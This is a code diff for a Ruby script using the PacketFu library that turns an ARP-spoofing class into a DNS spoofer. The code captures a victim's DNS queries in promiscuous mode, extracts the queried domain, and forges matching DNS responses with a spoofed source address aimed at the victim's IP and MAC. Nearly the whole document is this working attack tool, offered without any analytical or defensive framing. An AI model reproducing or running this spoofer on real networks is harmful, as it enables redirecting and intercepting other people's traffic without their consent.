@@ -13,7 +13,7 @@
 require 'rubygems'
 require 'packetfu'
 
-class ARP
+class DNS
 
 	@spoof_ip = ''
 	@victim_ip = ''
@@ -57,31 +57,37 @@ class ARP
 	# ============================================================================================	
 
 	def listen()
+		
+		puts "Listening for dns traffic..."
 		#setup the filter to only grab dns traffic from the victim
 		filter = "udp and port 53 and src " + @victim_ip
 
 		# Start packet sniffing
+        cap = PacketFu::Capture.new(:iface => @ifname, :start => true,
+                        :promisc => true, :filter => filter, :save => true)
         cap.stream.each do |pkt|
+
         	 if PacketFu::UDPPacket.can_parse?(pkt) then
                 packet = PacketFu::Packet.parse(pkt)
-					puts "Found Packet"
-					dns_type = packet.payload[2].unpack('h*')[0].chr + packet.payload[3].unpack('h*')[0].chr
 
-					if dns_type == 10 #not really ten, rather 1-0 (binnary) flag
+                dns_type = packet.payload[2].unpack('h*')[0].chr + \
+                           packet.payload[3].unpack('h*')[0].chr
+
+					if dns_type == '10' #not really ten, rather 1-0 (binnary) flag
 						puts "DNS Packet"
-						domain_name = get_domain(@packet.payload[12..-1])
-					end
+						domain_name = extract_domain_name(packet.payload[12..-1])	
+            
+					     # Check if domain name field is empty
+                        if domain_name.nil? then
+                            puts "Empty domain name field"
+                            next
+                        end # domain_name.nil?
 
-					 # Check if domain name field is empty
-                    if domain_name.nil? then
-                        puts "Empty domain name field"
-                        next
-                    end # domain_name.nil?
-
-                    send_response(packet, domain_name)
-
+                        send_response(packet, domain_name)
+                    end
              end # UDPPacket.can_parse?
         end #end packet capturing
+    end
 
 	# ============================================================================================	
 	# Extract_domain_name
@@ -91,12 +97,12 @@ class ARP
 	# ============================================================================================	
 	def extract_domain_name(payload)
 		domain_name = ""
+
         while(true)
         	
         	 len = payload[0].unpack('H*')[0].to_i
         	 # to understand below you might need to read up on dns packets. they take the form of [length][string][length][string][...]0
-        	
-        	 if len != 0 then #length of the first segment of the dns name
+        	 if len > 0 then #length of the first segment of the dns name
                 domain_name += payload[1, len] + "." #grab the first chunk from the begining, until the length specified by the packet
                 payload = payload[len + 1..-1]
             else
@@ -117,12 +123,12 @@ class ARP
 
  		dns_packet = PacketFu::UDPPacket.new(:config => @cfg)
         
-        dns.udp_src   = @packet.udp_dst
-        dns.udp_dst   = @packet.udp_src
-        dns.eth_daddr = @victim_mac
-        dns.ip_daddr  = @victim_ip
-        dns.ip_saddr  = @packet.ip_daddr
-        dns.payload   = packet.payload[0, 2] #identification from the packet that came in (these have to match)
+        dns_packet.udp_src   = packet.udp_dst
+        dns_packet.udp_dst   = packet.udp_src
+        dns_packet.eth_daddr = @victim_mac
+        dns_packet.ip_daddr  = @victim_ip
+        dns_packet.ip_saddr  = packet.ip_daddr
+        dns_packet.payload   = packet.payload[0, 2] #identification from the packet that came in (these have to match)
 		# Set the fields for the DNS protocol
       	dns_packet.payload += "\x81\x80"  #QR
       	dns_packet.payload += "\x00\x01"  # OPCode
@@ -130,9 +136,7 @@ class ARP
         dns_packet.payload += "\x00\x00" #Z
         dns_packet.payload += "\x00\x00" #RCode
 
-        domain_name.split('.').each do |part|
-        dns_packet.payload += part.length.chr
-        dns_packet.payload += part
+       
         #iterate through each domain name part and put the length and the data into the packet
         domain_name.split('.').each do |part|
             dns_packet.payload += part.length.chr
@@ -151,7 +155,7 @@ class ARP
         #recalculate the checksum and send back the packet to the sender
         dns_packet.recalc()
         dns_packet.to_w(@ifname)
+        puts dns_packet.payload
 	end
 end
-
 
